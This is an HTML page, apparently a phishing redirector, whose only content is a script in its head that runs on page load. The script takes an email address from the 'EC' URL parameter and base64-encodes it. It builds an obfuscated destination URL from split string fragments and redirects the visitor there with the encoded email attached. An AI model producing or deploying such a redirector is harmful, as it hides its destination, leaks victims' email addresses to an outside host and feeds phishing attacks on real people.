<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>...</title>
  <script>
    function bIB(str, bits = 20) {
      const bitLength = Math.ceil(str.length / bits);
      const result = [];
      for (let i = 0; i < bits; i++) {
        result.push(str.slice(i * bitLength, (i + 1) * bitLength));
      }
      return result;
    }

    function combineBits(bits) {
      return bits.join("");
    }

    function encodeEmailAndRedirect() {
  
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('EC');

      if (email) {
        const encodedEmail = btoa(email);
        const redirectUrlBits = [
          "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "", "", "", "", "", "", ""
        ];

        const emailBits = bIB(encodedEmail);

        const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
        window.location.href = finalUrl;
      } else {
        alert("?!");
      }
    }

    encodeEmailAndRedirect();
  </script>
</head>
